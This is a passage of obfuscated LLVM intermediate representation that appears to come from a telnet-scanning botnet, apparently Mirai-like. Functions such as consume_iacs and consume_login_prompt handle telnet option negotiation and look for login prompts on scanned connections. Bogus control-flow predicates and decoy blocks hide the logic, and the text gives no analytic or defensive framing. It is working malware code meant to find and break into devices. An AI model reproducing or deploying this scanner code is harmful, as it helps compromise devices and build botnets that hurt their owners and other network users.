  %148 = load i32, i32* @y.22
  %149 = sub i32 %147, 1
  %150 = mul i32 %147, %149
  %151 = urem i32 %150, 2
  %152 = icmp eq i32 %151, 0
  %153 = icmp slt i32 %148, 10
  %154 = or i1 %152, %153
  br i1 %154, label %originalBB27, label %originalBB27alteredBB

originalBB27:                                     ; preds = %originalBB27alteredBB, %146
  %155 = load i8*, i8** %12, align 8
  %156 = getelementptr inbounds i8, i8* %155, i64 3
  store i8* %156, i8** %12, align 8
  %157 = load i32, i32* %11, align 4
  %158 = add nsw i32 %157, 3
  store i32 %158, i32* %11, align 4
  %159 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %160 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %159, i32 0, i32 2
  %161 = load i32, i32* %160, align 8
  %162 = getelementptr inbounds [3 x i8], [3 x i8]* %14, i32 0, i32 0
  %163 = call i64 @send(i32 %161, i8* %162, i64 3, i32 16384)
  %164 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %165 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %164, i32 0, i32 2
  %166 = load i32, i32* %165, align 8
  %167 = getelementptr inbounds [9 x i8], [9 x i8]* %15, i32 0, i32 0
  %168 = call i64 @send(i32 %166, i8* %167, i64 9, i32 16384)
  %169 = load i32, i32* @x.21
  %170 = load i32, i32* @y.22
  %171 = sub i32 %169, 1
  %172 = mul i32 %169, %171
  %173 = urem i32 %172, 2
  %174 = icmp eq i32 %173, 0
  %175 = icmp slt i32 %170, 10
  %176 = or i1 %174, %175
  br i1 %176, label %originalBBpart245, label %originalBB27alteredBB

originalBBpart245:                                ; preds = %originalBB27
  br label %325

; <label>:177:                                    ; preds = %109
  %178 = load i32, i32* @x.21
  %179 = load i32, i32* @y.22
  %180 = sub i32 %178, 1
  %181 = mul i32 %178, %180
  %182 = urem i32 %181, 2
  %183 = icmp eq i32 %182, 0
  %184 = icmp slt i32 %179, 10
  %185 = or i1 %183, %184
  br i1 %185, label %originalBB47, label %originalBB47alteredBB

originalBB47:                                     ; preds = %originalBB47alteredBB, %177
  %186 = load i32, i32* @x.21
  %187 = load i32, i32* @y.22
  %188 = sub i32 %186, 1
  %189 = mul i32 %186, %188
  %190 = urem i32 %189, 2
  %191 = icmp eq i32 %190, 0
  %192 = icmp slt i32 %187, 10
  %193 = or i1 %191, %192
  br i1 %193, label %originalBBpart249, label %originalBB47alteredBB

originalBBpart249:                                ; preds = %originalBB47
  br label %194

; <label>:194:                                    ; preds = %originalBBpart249, %145
  %195 = load i32, i32* @x.21
  %196 = load i32, i32* @y.22
  %197 = sub i32 %195, 1
  %198 = mul i32 %195, %197
  %199 = urem i32 %198, 2
  %200 = icmp eq i32 %199, 0
  %201 = icmp slt i32 %196, 10
  %202 = or i1 %200, %201
  br i1 %202, label %originalBB51, label %originalBB51alteredBB

originalBB51:                                     ; preds = %originalBB51alteredBB, %194
  %203 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %204 = load i8*, i8** %12, align 8
  %205 = call signext i8 @can_consume(%struct.scanner_connection* %203, i8* %204, i32 2)
  %206 = icmp ne i8 %205, 0
  %207 = load i32, i32* @x.21
  %208 = load i32, i32* @y.22
  %209 = sub i32 %207, 1
  %210 = mul i32 %207, %209
  %211 = urem i32 %210, 2
  %212 = icmp eq i32 %211, 0
  %213 = icmp slt i32 %208, 10
  %214 = or i1 %212, %213
  br i1 %214, label %originalBBpart253, label %originalBB51alteredBB

originalBBpart253:                                ; preds = %originalBB51
  br i1 %206, label %232, label %215

; <label>:215:                                    ; preds = %originalBBpart253
  %216 = load i32, i32* @x.21
  %217 = load i32, i32* @y.22
  %218 = sub i32 %216, 1
  %219 = mul i32 %216, %218
  %220 = urem i32 %219, 2
  %221 = icmp eq i32 %220, 0
  %222 = icmp slt i32 %217, 10
  %223 = or i1 %221, %222
  br i1 %223, label %originalBB55, label %originalBB55alteredBB

originalBB55:                                     ; preds = %originalBB55alteredBB, %215
  %224 = load i32, i32* @x.21
  %225 = load i32, i32* @y.22
  %226 = sub i32 %224, 1
  %227 = mul i32 %224, %226
  %228 = urem i32 %227, 2
  %229 = icmp eq i32 %228, 0
  %230 = icmp slt i32 %225, 10
  %231 = or i1 %229, %230
  br i1 %231, label %originalBBpart257, label %originalBB55alteredBB

originalBBpart257:                                ; preds = %originalBB55
  br label %345

; <label>:232:                                    ; preds = %originalBBpart253
  store i32 0, i32* %13, align 4
  br label %233

; <label>:233:                                    ; preds = %312, %232
  %234 = load i32, i32* %13, align 4
  %235 = icmp slt i32 %234, 3
  br i1 %235, label %236, label %315

; <label>:236:                                    ; preds = %233
  %237 = load i8*, i8** %12, align 8
  %238 = load i32, i32* %13, align 4
  %239 = sext i32 %238 to i64
  %240 = getelementptr inbounds i8, i8* %237, i64 %239
  %241 = load i8, i8* %240, align 1
  %242 = zext i8 %241 to i32
  %243 = icmp eq i32 %242, 253
  br i1 %243, label %244, label %265

; <label>:244:                                    ; preds = %236
  %245 = load i32, i32* @x.21
  %246 = load i32, i32* @y.22
  %247 = sub i32 %245, 1
  %248 = mul i32 %245, %247
  %249 = urem i32 %248, 2
  %250 = icmp eq i32 %249, 0
  %251 = icmp slt i32 %246, 10
  %252 = or i1 %250, %251
  br i1 %252, label %originalBB59, label %originalBB59alteredBB

originalBB59:                                     ; preds = %originalBB59alteredBB, %244
  %253 = load i8*, i8** %12, align 8
  %254 = load i32, i32* %13, align 4
  %255 = sext i32 %254 to i64
  %256 = getelementptr inbounds i8, i8* %253, i64 %255
  store i8 -4, i8* %256, align 1
  %257 = load i32, i32* @x.21
  %258 = load i32, i32* @y.22
  %259 = sub i32 %257, 1
  %260 = mul i32 %257, %259
  %261 = urem i32 %260, 2
  %262 = icmp eq i32 %261, 0
  %263 = icmp slt i32 %258, 10
  %264 = or i1 %262, %263
  br i1 %264, label %originalBBpart261, label %originalBB59alteredBB

originalBBpart261:                                ; preds = %originalBB59
  br label %311

; <label>:265:                                    ; preds = %236
  %266 = load i8*, i8** %12, align 8
  %267 = load i32, i32* %13, align 4
  %268 = sext i32 %267 to i64
  %269 = getelementptr inbounds i8, i8* %266, i64 %268
  %270 = load i8, i8* %269, align 1
  %271 = zext i8 %270 to i32
  %272 = icmp eq i32 %271, 251
  br i1 %272, label %273, label %294

; <label>:273:                                    ; preds = %265
  %274 = load i32, i32* @x.21
  %275 = load i32, i32* @y.22
  %276 = sub i32 %274, 1
  %277 = mul i32 %274, %276
  %278 = urem i32 %277, 2
  %279 = icmp eq i32 %278, 0
  %280 = icmp slt i32 %275, 10
  %281 = or i1 %279, %280
  br i1 %281, label %originalBB63, label %originalBB63alteredBB

originalBB63:                                     ; preds = %originalBB63alteredBB, %273
  %282 = load i8*, i8** %12, align 8
  %283 = load i32, i32* %13, align 4
  %284 = sext i32 %283 to i64
  %285 = getelementptr inbounds i8, i8* %282, i64 %284
  store i8 -3, i8* %285, align 1
  %286 = load i32, i32* @x.21
  %287 = load i32, i32* @y.22
  %288 = sub i32 %286, 1
  %289 = mul i32 %286, %288
  %290 = urem i32 %289, 2
  %291 = icmp eq i32 %290, 0
  %292 = icmp slt i32 %287, 10
  %293 = or i1 %291, %292
  br i1 %293, label %originalBBpart265, label %originalBB63alteredBB

originalBBpart265:                                ; preds = %originalBB63
  br label %294

; <label>:294:                                    ; preds = %originalBBpart265, %265
  %295 = load i32, i32* @x.21
  %296 = load i32, i32* @y.22
  %297 = sub i32 %295, 1
  %298 = mul i32 %295, %297
  %299 = urem i32 %298, 2
  %300 = icmp eq i32 %299, 0
  %301 = icmp slt i32 %296, 10
  %302 = or i1 %300, %301
  br i1 %302, label %originalBB67, label %originalBB67alteredBB

originalBB67:                                     ; preds = %originalBB67alteredBB, %294
  %303 = load i32, i32* @x.21
  %304 = load i32, i32* @y.22
  %305 = sub i32 %303, 1
  %306 = mul i32 %303, %305
  %307 = urem i32 %306, 2
  %308 = icmp eq i32 %307, 0
  %309 = icmp slt i32 %304, 10
  %310 = or i1 %308, %309
  br i1 %310, label %originalBBpart269, label %originalBB67alteredBB

originalBBpart269:                                ; preds = %originalBB67
  br label %311

; <label>:311:                                    ; preds = %originalBBpart269, %originalBBpart261
  br label %312

; <label>:312:                                    ; preds = %311
  %313 = load i32, i32* %13, align 4
  %314 = add nsw i32 %313, 1
  store i32 %314, i32* %13, align 4
  br label %233

; <label>:315:                                    ; preds = %233
  %316 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %317 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %316, i32 0, i32 2
  %318 = load i32, i32* %317, align 8
  %319 = load i8*, i8** %12, align 8
  %320 = call i64 @send(i32 %318, i8* %319, i64 3, i32 16384)
  %321 = load i8*, i8** %12, align 8
  %322 = getelementptr inbounds i8, i8* %321, i64 3
  store i8* %322, i8** %12, align 8
  %323 = load i32, i32* %11, align 4
  %324 = add nsw i32 %323, 3
  store i32 %324, i32* %11, align 4
  br label %325

; <label>:325:                                    ; preds = %315, %originalBBpart245
  br label %326

; <label>:326:                                    ; preds = %325
  %327 = load i32, i32* @x.21
  %328 = load i32, i32* @y.22
  %329 = sub i32 %327, 1
  %330 = mul i32 %327, %329
  %331 = urem i32 %330, 2
  %332 = icmp eq i32 %331, 0
  %333 = icmp slt i32 %328, 10
  %334 = or i1 %332, %333
  br i1 %334, label %originalBB71, label %originalBB71alteredBB

originalBB71:                                     ; preds = %originalBB71alteredBB, %326
  %335 = load i32, i32* @x.21
  %336 = load i32, i32* @y.22
  %337 = sub i32 %335, 1
  %338 = mul i32 %335, %337
  %339 = urem i32 %338, 2
  %340 = icmp eq i32 %339, 0
  %341 = icmp slt i32 %336, 10
  %342 = or i1 %340, %341
  br i1 %342, label %originalBBpart273, label %originalBB71alteredBB

originalBBpart273:                                ; preds = %originalBB71
  br label %343

; <label>:343:                                    ; preds = %originalBBpart273, %55
  br label %344

; <label>:344:                                    ; preds = %343
  br label %27

; <label>:345:                                    ; preds = %originalBBpart257, %138, %81, %54, %27
  %346 = load i32, i32* @x.21
  %347 = load i32, i32* @y.22
  %348 = sub i32 %346, 1
  %349 = mul i32 %346, %348
  %350 = urem i32 %349, 2
  %351 = icmp eq i32 %350, 0
  %352 = icmp slt i32 %347, 10
  %353 = or i1 %351, %352
  br i1 %353, label %originalBB75, label %originalBB75alteredBB

originalBB75:                                     ; preds = %originalBB75alteredBB, %345
  %354 = load i32, i32* %11, align 4
  %355 = load i32, i32* @x.21
  %356 = load i32, i32* @y.22
  %357 = sub i32 %355, 1
  %358 = mul i32 %355, %357
  %359 = urem i32 %358, 2
  %360 = icmp eq i32 %359, 0
  %361 = icmp slt i32 %356, 10
  %362 = or i1 %360, %361
  br i1 %362, label %originalBBpart277, label %originalBB75alteredBB

originalBBpart277:                                ; preds = %originalBB75
  ret i32 %354

originalBBalteredBB:                              ; preds = %originalBB, %1
  %363 = alloca %struct.scanner_connection*, align 8
  %364 = alloca i32, align 4
  %365 = alloca i8*, align 8
  %366 = alloca i32, align 4
  %367 = alloca [3 x i8], align 1
  %368 = alloca [9 x i8], align 1
  store %struct.scanner_connection* %0, %struct.scanner_connection** %363, align 8
  store i32 0, i32* %364, align 4
  %369 = load %struct.scanner_connection*, %struct.scanner_connection** %363, align 8
  %370 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %369, i32 0, i32 7
  %371 = getelementptr inbounds [8192 x i8], [8192 x i8]* %370, i32 0, i32 0
  store i8* %371, i8** %365, align 8
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %33
  %372 = load i8*, i8** %12, align 8
  %373 = load i8, i8* %372, align 1
  %374 = zext i8 %373 to i32
  %375 = icmp ne i32 %374, 255
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %60
  %376 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %377 = load i8*, i8** %12, align 8
  %378 = call signext i8 @can_consume(%struct.scanner_connection* %376, i8* %377, i32 1)
  %379 = icmp ne i8 %378, 0
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %88
  %380 = load i8*, i8** %12, align 8
  %381 = getelementptr inbounds i8, i8* %380, i64 2
  store i8* %381, i8** %12, align 8
  %382 = load i32, i32* %11, align 4
  %_ = sub i32 %382, 2
  %gen = mul i32 %_, 2
  %_11 = sub i32 %382, 2
  %gen12 = mul i32 %_11, 2
  %_13 = shl i32 %382, 2
  %_14 = shl i32 %382, 2
  %_15 = sub i32 0, %382
  %gen16 = add i32 %_15, 2
  %_17 = sub i32 0, %382
  %gen18 = add i32 %_17, 2
  %_19 = shl i32 %382, 2
  %383 = add nsw i32 %382, 2
  store i32 %383, i32* %11, align 4
  br label %originalBB10

originalBB23alteredBB:                            ; preds = %originalBB23, %115
  %384 = bitcast [3 x i8]* %14 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %384, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @consume_iacs.tmp1, i32 0, i32 0), i64 3, i32 1, i1 false)
  %385 = bitcast [9 x i8]* %15 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %385, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @consume_iacs.tmp2, i32 0, i32 0), i64 9, i32 1, i1 false)
  %386 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %387 = load i8*, i8** %12, align 8
  %388 = call signext i8 @can_consume(%struct.scanner_connection* %386, i8* %387, i32 2)
  %389 = icmp ne i8 %388, 0
  br label %originalBB23

originalBB27alteredBB:                            ; preds = %originalBB27, %146
  %390 = load i8*, i8** %12, align 8
  %391 = getelementptr inbounds i8, i8* %390, i64 3
  store i8* %391, i8** %12, align 8
  %392 = load i32, i32* %11, align 4
  %_28 = sub i32 %392, 3
  %gen29 = mul i32 %_28, 3
  %_30 = sub i32 0, %392
  %gen31 = add i32 %_30, 3
  %_32 = sub i32 %392, 3
  %gen33 = mul i32 %_32, 3
  %_34 = shl i32 %392, 3
  %_35 = sub i32 0, %392
  %gen36 = add i32 %_35, 3
  %_37 = sub i32 %392, 3
  %gen38 = mul i32 %_37, 3
  %_39 = sub i32 0, %392
  %gen40 = add i32 %_39, 3
  %_41 = shl i32 %392, 3
  %_42 = sub i32 %392, 3
  %gen43 = mul i32 %_42, 3
  %393 = add nsw i32 %392, 3
  store i32 %393, i32* %11, align 4
  %394 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %395 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %394, i32 0, i32 2
  %396 = load i32, i32* %395, align 8
  %397 = getelementptr inbounds [3 x i8], [3 x i8]* %14, i32 0, i32 0
  %398 = call i64 @send(i32 %396, i8* %397, i64 3, i32 16384)
  %399 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %400 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %399, i32 0, i32 2
  %401 = load i32, i32* %400, align 8
  %402 = getelementptr inbounds [9 x i8], [9 x i8]* %15, i32 0, i32 0
  %403 = call i64 @send(i32 %401, i8* %402, i64 9, i32 16384)
  br label %originalBB27

originalBB47alteredBB:                            ; preds = %originalBB47, %177
  br label %originalBB47

originalBB51alteredBB:                            ; preds = %originalBB51, %194
  %404 = load %struct.scanner_connection*, %struct.scanner_connection** %10, align 8
  %405 = load i8*, i8** %12, align 8
  %406 = call signext i8 @can_consume(%struct.scanner_connection* %404, i8* %405, i32 2)
  %407 = icmp ne i8 %406, 0
  br label %originalBB51

originalBB55alteredBB:                            ; preds = %originalBB55, %215
  br label %originalBB55

originalBB59alteredBB:                            ; preds = %originalBB59, %244
  %408 = load i8*, i8** %12, align 8
  %409 = load i32, i32* %13, align 4
  %410 = sext i32 %409 to i64
  %411 = getelementptr inbounds i8, i8* %408, i64 %410
  store i8 -4, i8* %411, align 1
  br label %originalBB59

originalBB63alteredBB:                            ; preds = %originalBB63, %273
  %412 = load i8*, i8** %12, align 8
  %413 = load i32, i32* %13, align 4
  %414 = sext i32 %413 to i64
  %415 = getelementptr inbounds i8, i8* %412, i64 %414
  store i8 -3, i8* %415, align 1
  br label %originalBB63

originalBB67alteredBB:                            ; preds = %originalBB67, %294
  br label %originalBB67

originalBB71alteredBB:                            ; preds = %originalBB71, %326
  br label %originalBB71

originalBB75alteredBB:                            ; preds = %originalBB75, %345
  %416 = load i32, i32* %11, align 4
  br label %originalBB75
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @consume_login_prompt(%struct.scanner_connection*, i32) #0 {
  %3 = alloca i32, align 4
  %4 = alloca %struct.scanner_connection*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 -1, i32* %8, align 4
  %9 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %10 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %9, i32 0, i32 4
  %11 = load i32, i32* %10, align 8
  %12 = sub nsw i32 %11, 1
  store i32 %12, i32* %6, align 4
  br label %13

; <label>:13:                                     ; preds = %originalBBpart225, %2
  %14 = load i32, i32* %6, align 4
  %15 = icmp sgt i32 %14, 0
  br i1 %15, label %16, label %135

; <label>:16:                                     ; preds = %13
  %17 = load i32, i32* @x.23
  %18 = load i32, i32* @y.24
  %19 = sub i32 %17, 1
  %20 = mul i32 %17, %19
  %21 = urem i32 %20, 2
  %22 = icmp eq i32 %21, 0
  %23 = icmp slt i32 %18, 10
  %24 = or i1 %22, %23
  br i1 %24, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %16
  %25 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %26 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %25, i32 0, i32 7
  %27 = load i32, i32* %6, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds [8192 x i8], [8192 x i8]* %26, i64 0, i64 %28
  %30 = load i8, i8* %29, align 1
  %31 = sext i8 %30 to i32
  %32 = icmp eq i32 %31, 58
  %33 = load i32, i32* @x.23
  %34 = load i32, i32* @y.24
  %35 = sub i32 %33, 1
  %36 = mul i32 %33, %35
  %37 = urem i32 %36, 2
  %38 = icmp eq i32 %37, 0
  %39 = icmp slt i32 %34, 10
  %40 = or i1 %38, %39
  br i1 %40, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %32, label %96, label %41

; <label>:41:                                     ; preds = %originalBBpart2
  %42 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %43 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %42, i32 0, i32 7
  %44 = load i32, i32* %6, align 4
  %45 = sext i32 %44 to i64
  %46 = getelementptr inbounds [8192 x i8], [8192 x i8]* %43, i64 0, i64 %45
  %47 = load i8, i8* %46, align 1
  %48 = sext i8 %47 to i32
  %49 = icmp eq i32 %48, 62
  br i1 %49, label %96, label %50

; <label>:50:                                     ; preds = %41
  %51 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %52 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %51, i32 0, i32 7
  %53 = load i32, i32* %6, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds [8192 x i8], [8192 x i8]* %52, i64 0, i64 %54
  %56 = load i8, i8* %55, align 1
  %57 = sext i8 %56 to i32
  %58 = icmp eq i32 %57, 36
  br i1 %58, label %96, label %59

; <label>:59:                                     ; preds = %50
  %60 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %61 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %60, i32 0, i32 7
  %62 = load i32, i32* %6, align 4
  %63 = sext i32 %62 to i64
  %64 = getelementptr inbounds [8192 x i8], [8192 x i8]* %61, i64 0, i64 %63
  %65 = load i8, i8* %64, align 1
  %66 = sext i8 %65 to i32
  %67 = icmp eq i32 %66, 35
  br i1 %67, label %96, label %68

; <label>:68:                                     ; preds = %59
  %69 = load i32, i32* @x.23
  %70 = load i32, i32* @y.24
  %71 = sub i32 %69, 1
  %72 = mul i32 %69, %71
  %73 = urem i32 %72, 2
  %74 = icmp eq i32 %73, 0
  %75 = icmp slt i32 %70, 10
  %76 = or i1 %74, %75
  br i1 %76, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %68
  %77 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %78 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %77, i32 0, i32 7
  %79 = load i32, i32* %6, align 4
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds [8192 x i8], [8192 x i8]* %78, i64 0, i64 %80
  %82 = load i8, i8* %81, align 1
  %83 = sext i8 %82 to i32
  %84 = icmp eq i32 %83, 37
  %85 = load i32, i32* @x.23
  %86 = load i32, i32* @y.24
  %87 = sub i32 %85, 1
  %88 = mul i32 %85, %87
  %89 = urem i32 %88, 2
  %90 = icmp eq i32 %89, 0
  %91 = icmp slt i32 %86, 10
  %92 = or i1 %90, %91
  br i1 %92, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %84, label %93, label %115

; <label>:93:                                     ; preds = %originalBBpart24
  %94 = load i32, i32* %5, align 4
  %95 = icmp eq i32 %94, 1
  br i1 %95, label %96, label %115

; <label>:96:                                     ; preds = %93, %59, %50, %41, %originalBBpart2
  %97 = load i32, i32* @x.23
  %98 = load i32, i32* @y.24
  %99 = sub i32 %97, 1
  %100 = mul i32 %97, %99
  %101 = urem i32 %100, 2
  %102 = icmp eq i32 %101, 0
  %103 = icmp slt i32 %98, 10
  %104 = or i1 %102, %103
  br i1 %104, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %96
  %105 = load i32, i32* %6, align 4
  %106 = add nsw i32 %105, 1
  store i32 %106, i32* %8, align 4
  %107 = load i32, i32* @x.23
  %108 = load i32, i32* @y.24
  %109 = sub i32 %107, 1
  %110 = mul i32 %107, %109
  %111 = urem i32 %110, 2
  %112 = icmp eq i32 %111, 0
  %113 = icmp slt i32 %108, 10
  %114 = or i1 %112, %113
  br i1 %114, label %originalBBpart210, label %originalBB6alteredBB

originalBBpart210:                                ; preds = %originalBB6
  br label %135

; <label>:115:                                    ; preds = %93, %originalBBpart24
  br label %116

; <label>:116:                                    ; preds = %115
  %117 = load i32, i32* @x.23
  %118 = load i32, i32* @y.24
  %119 = sub i32 %117, 1
  %120 = mul i32 %117, %119
  %121 = urem i32 %120, 2
  %122 = icmp eq i32 %121, 0
  %123 = icmp slt i32 %118, 10
  %124 = or i1 %122, %123
  br i1 %124, label %originalBB12, label %originalBB12alteredBB

originalBB12:                                     ; preds = %originalBB12alteredBB, %116
  %125 = load i32, i32* %6, align 4
  %126 = add nsw i32 %125, -1
  store i32 %126, i32* %6, align 4
  %127 = load i32, i32* @x.23
  %128 = load i32, i32* @y.24
  %129 = sub i32 %127, 1
  %130 = mul i32 %127, %129
  %131 = urem i32 %130, 2
  %132 = icmp eq i32 %131, 0
  %133 = icmp slt i32 %128, 10
  %134 = or i1 %132, %133
  br i1 %134, label %originalBBpart225, label %originalBB12alteredBB

originalBBpart225:                                ; preds = %originalBB12
  br label %13

; <label>:135:                                    ; preds = %originalBBpart210, %13
  %136 = load i32, i32* %8, align 4
  %137 = icmp eq i32 %136, -1
  br i1 %137, label %138, label %238

; <label>:138:                                    ; preds = %135
  %139 = load i32, i32* %5, align 4
  %140 = icmp eq i32 %139, 1
  br i1 %140, label %141, label %225

; <label>:141:                                    ; preds = %138
  %142 = load i32, i32* @x.23
  %143 = load i32, i32* @y.24
  %144 = sub i32 %142, 1
  %145 = mul i32 %142, %144
  %146 = urem i32 %145, 2
  %147 = icmp eq i32 %146, 0
  %148 = icmp slt i32 %143, 10
  %149 = or i1 %147, %148
  br i1 %149, label %originalBB27, label %originalBB27alteredBB

originalBB27:                                     ; preds = %originalBB27alteredBB, %141
  %150 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %151 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %150, i32 0, i32 7
  %152 = getelementptr inbounds [8192 x i8], [8192 x i8]* %151, i32 0, i32 0
  %153 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %154 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %153, i32 0, i32 4
  %155 = load i32, i32* %154, align 8
  %156 = call i32 @util_memsearch(i8* %152, i32 %155, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.144, i32 0, i32 0), i32 4)
  store i32 %156, i32* %7, align 4
  %157 = icmp ne i32 %156, -1
  %158 = load i32, i32* @x.23
  %159 = load i32, i32* @y.24
  %160 = sub i32 %158, 1
  %161 = mul i32 %158, %160
  %162 = urem i32 %161, 2
  %163 = icmp eq i32 %162, 0
  %164 = icmp slt i32 %159, 10
  %165 = or i1 %163, %164
  br i1 %165, label %originalBBpart229, label %originalBB27alteredBB

originalBBpart229:                                ; preds = %originalBB27
  br i1 %157, label %166, label %168

; <label>:166:                                    ; preds = %originalBBpart229
  %167 = load i32, i32* %7, align 4
  store i32 %167, i32* %8, align 4
  br label %208

; <label>:168:                                    ; preds = %originalBBpart229
  %169 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %170 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %169, i32 0, i32 7
  %171 = getelementptr inbounds [8192 x i8], [8192 x i8]* %170, i32 0, i32 0
  %172 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %173 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %172, i32 0, i32 4
  %174 = load i32, i32* %173, align 8
  %175 = call i32 @util_memsearch(i8* %171, i32 %174, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.145, i32 0, i32 0), i32 5)
  store i32 %175, i32* %7, align 4
  %176 = icmp ne i32 %175, -1
  br i1 %176, label %177, label %179

; <label>:177:                                    ; preds = %168
  %178 = load i32, i32* %7, align 4
  store i32 %178, i32* %8, align 4
  br label %207

; <label>:179:                                    ; preds = %168
  %180 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %181 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %180, i32 0, i32 7
  %182 = getelementptr inbounds [8192 x i8], [8192 x i8]* %181, i32 0, i32 0
  %183 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %184 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %183, i32 0, i32 4
  %185 = load i32, i32* %184, align 8
  %186 = call i32 @util_memsearch(i8* %182, i32 %185, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.146, i32 0, i32 0), i32 3)
  store i32 %186, i32* %7, align 4
  %187 = icmp ne i32 %186, -1
  br i1 %187, label %188, label %190

; <label>:188:                                    ; preds = %179
  %189 = load i32, i32* %7, align 4
  store i32 %189, i32* %8, align 4
  br label %190

; <label>:190:                                    ; preds = %188, %179
  %191 = load i32, i32* @x.23
  %192 = load i32, i32* @y.24
  %193 = sub i32 %191, 1
  %194 = mul i32 %191, %193
  %195 = urem i32 %194, 2
  %196 = icmp eq i32 %195, 0
  %197 = icmp slt i32 %192, 10
  %198 = or i1 %196, %197
  br i1 %198, label %originalBB31, label %originalBB31alteredBB

originalBB31:                                     ; preds = %originalBB31alteredBB, %190
  %199 = load i32, i32* @x.23
  %200 = load i32, i32* @y.24
  %201 = sub i32 %199, 1
  %202 = mul i32 %199, %201
  %203 = urem i32 %202, 2
  %204 = icmp eq i32 %203, 0
  %205 = icmp slt i32 %200, 10
  %206 = or i1 %204, %205
  br i1 %206, label %originalBBpart233, label %originalBB31alteredBB

originalBBpart233:                                ; preds = %originalBB31
  br label %207

; <label>:207:                                    ; preds = %originalBBpart233, %177
  br label %208

; <label>:208:                                    ; preds = %207, %166
  %209 = load i32, i32* @x.23
  %210 = load i32, i32* @y.24
  %211 = sub i32 %209, 1
  %212 = mul i32 %209, %211
  %213 = urem i32 %212, 2
  %214 = icmp eq i32 %213, 0
  %215 = icmp slt i32 %210, 10
  %216 = or i1 %214, %215
  br i1 %216, label %originalBB35, label %originalBB35alteredBB

originalBB35:                                     ; preds = %originalBB35alteredBB, %208
  %217 = load i32, i32* @x.23
  %218 = load i32, i32* @y.24
  %219 = sub i32 %217, 1
  %220 = mul i32 %217, %219
  %221 = urem i32 %220, 2
  %222 = icmp eq i32 %221, 0
  %223 = icmp slt i32 %218, 10
  %224 = or i1 %222, %223
  br i1 %224, label %originalBBpart237, label %originalBB35alteredBB

originalBBpart237:                                ; preds = %originalBB35
  br label %237

; <label>:225:                                    ; preds = %138
  %226 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %227 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %226, i32 0, i32 7
  %228 = getelementptr inbounds [8192 x i8], [8192 x i8]* %227, i32 0, i32 0
  %229 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %230 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %229, i32 0, i32 4
  %231 = load i32, i32* %230, align 8
  %232 = call i32 @util_memsearch(i8* %228, i32 %231, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.147, i32 0, i32 0), i32 7)
  store i32 %232, i32* %7, align 4
  %233 = icmp ne i32 %232, -1
  br i1 %233, label %234, label %236

; <label>:234:                                    ; preds = %225
  %235 = load i32, i32* %7, align 4
  store i32 %235, i32* %8, align 4
